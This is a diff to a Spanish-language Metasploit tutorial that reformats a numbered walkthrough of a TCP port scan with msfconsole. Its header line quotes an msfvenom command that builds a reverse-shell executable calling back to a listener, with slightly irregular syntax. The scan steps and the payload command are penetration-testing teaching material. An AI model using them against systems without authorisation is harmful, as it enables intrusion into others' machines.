@@ -92,35 +92,36 @@ msfvenom -p /python/shell_reverse_tcp lhost=192.168.20.123 lport 888 -f exe -o s
 
 #### Ejemplo
 Ahora veremos un ejemplo de uso de metasploit, para realizar un escaneo de puertos. 
-\1. Comezamos lanzando metasploit 
+
+1. Comezamos lanzando metasploit 
 
 ```bash
 msfconsole
 ```
-\2. Buscamos el exploit relacionado 
+2. Buscamos el exploit relacionado 
 
 ```bash
 search portscan 
 ```
-\3. Usamos el exploit que escogamos 
+3. Usamos el exploit que escogamos 
 
 ```bash
 use /auxiliary/scanner/portscan/tcp 
 ```
 
-\4. Vemos las opciones del exploit 
+4. Vemos las opciones del exploit 
 
 ```bash
 show options 
 ```
 
-\5. Configuramos las variables necesarios (Yes)
+5. Configuramos las variables necesarios (Yes)
 
 ```bash
 set rhosts 192.168.20.123 
 ```
 
-\6. Lo lanzamos 
+6. Lo lanzamos 
 
 ```bash
 exploit 
